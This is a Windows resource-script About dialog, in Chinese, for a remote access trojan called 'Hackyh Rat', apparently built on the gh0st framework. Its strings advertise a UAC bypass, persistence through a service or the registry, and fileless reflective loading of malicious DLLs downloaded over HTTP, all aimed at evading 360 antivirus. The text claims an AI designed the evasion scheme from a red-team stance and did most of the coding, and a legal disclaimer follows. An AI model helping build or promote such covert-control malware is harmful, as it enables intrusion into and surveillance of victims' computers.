IDD_ABOUTBOX DIALOGEX 0, 0, 370, 368
STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION "关于"
FONT 10, "新宋体", 400, 0, 0x86
BEGIN
    ICON            IDR_MAINFRAME,IDC_STATIC,112,25,20,20
    LTEXT           "本程序源自gh0st框架修改而来，项目由VC++转换升级至VS2019编译",IDC_STATIC,18,60,243,9,SS_NOPREFIX
    LTEXT           "Copyright@ 2026 By:Hackyh",IDC_STATIC,130,322,149,8
    DEFPUSHBUTTON   "确定",IDOK,166,339,50,14,WS_GROUP
    LTEXT           "耗时10余天 几乎全程指挥AI编译修改",IDC_STATIC,18,72,152,9,SS_NOPREFIX
    LTEXT           "Hackyh Rat 2026 V1.0 个人版",IDC_STATIC,138,30,115,8,SS_NOPREFIX
    LTEXT           "主要修改参数：",IDC_STATIC,18,83,61,9,SS_NOPREFIX
    LTEXT           "上去先修改主控端界面 版权 图标 版本信息 (装逼必备)",IDC_STATIC,18,93,207,9,SS_NOPREFIX
    LTEXT           "配置服务端界面 增加小马自定义释放路径+文件名+后缀(由用户任意设置)",IDC_STATIC,18,103,270,9,SS_NOPREFIX
    LTEXT           "修复Win10和Win11下 远程视频查看异常（鸡肋 刷新率太慢了高分辨率更慢但好歹能用）",IDC_STATIC,18,113,315,9,SS_NOPREFIX
    LTEXT           "修复上线统计栏 增加Win10 Win11 WinServer2012-2016-2019-2022+最新版WinServer2025",IDC_STATIC,18,123,324,9,SS_NOPREFIX
    LTEXT           "添加绕过Win账户权限分配机制(UAC)提权成功直接写服务启动否则降权写注册表启动实现持久化",IDC_STATIC,18,133,337,9,SS_NOPREFIX
    LTEXT           "*****最关键部分 据说能突破最新360核晶防护引擎*****",IDC_STATIC,62,148,226,9,SS_NOPREFIX
    LTEXT           "由AI站在红队立场分析总结制定方案 :",IDC_STATIC,18,161,202,9,SS_NOPREFIX
    LTEXT           "被控端增加 RW/RX 双视图内存加载机制 小马执行后拷贝自身 到用户自定义目录 ",IDC_STATIC,18,171,291,9,SS_NOPREFIX
    LTEXT           "通过自定义HTTP链接下载云端 具有实际操作控制功能的恶意DLL插件 ",IDC_STATIC,18,181,250,9,SS_NOPREFIX
    LTEXT           "然后通过反射式内存加载技术 把DLL插件 映射到自身进程私有地址空间",IDC_STATIC,18,190,263,9,SS_NOPREFIX
    LTEXT           "全程恶意插件DLL文件不落盘 每次开机启动时小马通过HTTP请求把恶意插件",IDC_STATIC,18,200,265,9,SS_NOPREFIX
    LTEXT           "下载到自身内存加载 所以DLL始终只存在于小马(宿主进程)的内存中",IDC_STATIC,18,210,244,9,SS_NOPREFIX
    LTEXT           "杀毒根本找不到恶意插件DLL文件 全程磁盘上唯一落地的是小马这个空壳装载器自身。",IDC_STATIC,18,220,316,9,SS_NOPREFIX
    LTEXT           "恶意插件DLL永远在云端 无法被杀毒软件捕获 从而避免被反调试研究。",IDC_STATIC,18,230,256,9,SS_NOPREFIX
    LTEXT           "小马大小仅有 19KB 却实现了控制目标计算机的全部功能",IDC_STATIC,18,240,219,9,SS_NOPREFIX
    LTEXT           "*****请在使用本软件前仔细阅读以下声明*****",IDC_STATIC,85,254,218,9,SS_NOPREFIX
    LTEXT           "本项目仅做合法的技术研究、学习交流和授权的远程管理使用。",IDC_STATIC,18,267,228,9,SS_NOPREFIX
    LTEXT           "严禁将本软件用于未经授权访问他人计算机系统、窃取数据、监控他人隐私等任何违法行为。",IDC_STATIC,18,277,332,9,SS_NOPREFIX
    LTEXT           "使用者必须遵守所在国家/地区的法律法规 因使用本软件产生的任何法律责任 由使用者承担。",IDC_STATIC,18,287,336,9,SS_NOPREFIX
    LTEXT           "开发者不对因使用 误用或无法使用本软件而造成的任何直接 间接 或特殊后果性损害承担责任。",IDC_STATIC,18,297,343,9,SS_NOPREFIX
END

